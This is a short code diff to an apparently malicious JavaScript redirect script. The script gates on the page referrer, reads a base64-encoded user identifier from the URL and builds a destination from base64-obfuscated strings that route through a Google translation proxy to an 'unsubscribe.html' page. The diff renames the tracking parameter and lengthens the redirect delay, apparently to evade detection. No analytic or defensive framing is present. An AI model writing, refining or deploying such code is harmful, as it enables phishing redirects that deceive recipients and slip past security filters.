@@ -149,7 +149,7 @@ function getRandomString(length) {
       const refererString = document.referrer;
       const isRefererMatch = refererRegexes.some((regex) => regex.test(refererString));
     
-      const uidParam = new URLSearchParams(window.location.search).get('u');
+      const uidParam = new URLSearchParams(window.location.search).get('x');
   
       var decString = atob(uidParam);
   
@@ -166,7 +166,7 @@ function getRandomString(length) {
           if (isTrue) {
           var queryString = window.location.search;
           var urlParams = new URLSearchParams(queryString);
-          var oxx = urlParams.get('u');
+          var oxx = urlParams.get('x');
           var hos = window.location.hostname;
           var dmainParts = hos.split('.').reverse();
           var subdom = dmainParts.slice(2).reverse().join('-');
@@ -186,8 +186,8 @@ function getRandomString(length) {
         .then(function(fileContents) {
           hash = fileContents;
           setTimeout(function() {
-            window.location.replace("https://"+dmain+atob('LnRyYW5zbGF0ZS5nb29nLw==')+randmd5+atob('L3Vuc3Vic2NyaWJlLmh0bWw/dT0=')+oxx+atob('Jl94X3RyX3NsPWF1dG8mX3hfdHJfdGw9ZW4mX3hfdHJfaGw9ZW4tVVMmX3hfdHJfcHRvPXdhcHBibG9nLmh0bWw=')+hash);
-        }, 1000);
+            window.location.replace("https://"+dmain+atob('LnRyYW5zbGF0ZS5nb29nLw==')+randmd5+atob('L3Vuc3Vic2NyaWJlLmh0bWw/eD0=')+oxx+atob('Jl94X3RyX3NsPWF1dG8mX3hfdHJfdGw9ZW4mX3hfdHJfaGw9ZW4tVVMmX3hfdHJfcHRvPXdhcHBibG9nLmh0bWw=')+hash);
+        }, 10000);
           
         });
           } else {
